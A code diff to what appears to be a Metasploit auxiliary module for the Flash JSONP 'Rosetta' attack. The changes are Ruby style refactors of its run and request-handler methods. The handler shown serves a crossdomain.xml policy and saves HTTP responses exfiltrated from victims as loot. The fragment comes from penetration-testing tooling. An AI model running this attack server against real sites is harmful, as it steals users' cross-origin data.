@@ -53,11 +53,11 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    if datastore['CHECK'] and check == Msf::Exploit::CheckCode::Safe
+    if datastore['CHECK'] && check == Msf::Exploit::CheckCode::Safe
       raise "JSONP endpoint does not allow sufficiently long callback names."
     end
 
-    if not datastore['URIPATH'] == '/'
+    unless datastore['URIPATH'] == '/'
       raise "URIPATH must be set to '/' to intercept crossdomain.xml request."
     end
 
@@ -75,10 +75,10 @@ class Metasploit3 < Msf::Auxiliary
 
   def on_request_uri(cli, request)
     vprint_status("Request '#{request.method} #{request.uri}'")
-    if request.uri =~ /crossdomain\.xml/
+    if request.uri.end_with? 'crossdomain.xml'
       print_status "Responding to crossdomain request.."
       send_response(cli, crossdomain_xml, 'Content-type' => 'text/x-cross-domain-policy')
-    elsif request.uri =~ /\.log/
+    elsif request.uri.end_with? '.log'
       body = URI.decode(request.body)
       file = store_loot(
         "html", "text/plain", cli.peerhost, body, "flash_jsonp_rosetta", "Exfiltrated HTTP response"
